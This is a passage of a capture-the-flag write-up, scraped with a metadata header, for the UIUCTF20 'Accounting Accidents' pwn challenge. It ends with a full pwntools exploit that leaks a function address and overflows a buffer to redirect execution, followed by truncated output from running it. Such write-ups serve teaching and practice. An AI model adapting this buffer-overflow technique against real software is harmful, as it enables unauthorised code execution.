@@ -1,0 +1,65 @@
+---
+SOURCE: livesearch
+URL: https://fanpu.io/blog/2020/UIUCTF20-accounting-accidents-pwn-write-up/
+CHALLENGE: UIUCTF20 Accounting Accidents Pwn Writeup | Fan Pu Zeng
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: other
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: read
+KEY_TECHNIQUE: Writeup for UIUCTF20 Accounting Accidents Pwn Writeup | Fan Pu Zeng — other exploitation technique.
+---
+ rather sweet spot. Finally, let’s cause a rotation at 30 by causing one of its child to increase in height. We can grow the height of the subtree rooted at 20 by either adding something less than 10, or something between 21 or 25. Let’s go with adding 22: AVL tree after inserting 22 We did it! Full Exploit The full exploit script is given below: 1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49 #!/usr/bin/env python3 from pwn import * elf = ELF ( "./accounting" ) context . binary = elf context . terminal = [ ' kitty ' , ' - e ' , ' sh ' , ' - c ' ] if args . REMOTE : conn = remote ( "chal.uiuc.tf" , 2001 ) else : conn = process ([ elf . path ]) def main () : # Note that each of the recv steps can take a while to run, # because of the fancy printing. It is not frozen! print ( conn . recvuntil ( "{" )) leak = conn . recvuntil ( "}" )[ :- 1 ] # Leak print_flag address flag_addr = int ( leak , 16 ) print ( "print_flag address: " , hex ( flag_addr )) # Overflow exploit print ( conn . recvuntil ( "Item: " )) exp = b "A" * 0x10 exp += p32 ( flag_addr ) conn . sendline ( exp ) # First price input print ( conn . recvuntil ( "Shrub Trimming Cost: " )) conn . sendline ( ' 26 ' ) # Second price input print ( conn . recvuntil ( "Raymond Hush $$ Cost: " )) conn . sendline ( ' 27 ' ) # Third price input print ( conn . recvuntil ( "Town Hall Food Cost: " )) conn . sendline ( ' 21 ' ) # Last price input print ( conn . recvuntil ( "New Wall Art Cost: " )) conn . sendline ( ' 22 ' ) conn . interactive () if __name__ == "__main__" : main () Running the exploit script against the challenge server: ➜  accounting python solve.py REMOTE
+[+] Opening connection to chal.uiuc.tf on port 2001: Done
+b'[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {'
+print_flag address:  0x8048878
+b'\n[NookAccounting]: Added "Apples" with cost of 10 bells to accounting spreadsheet.\n[NookAccounti
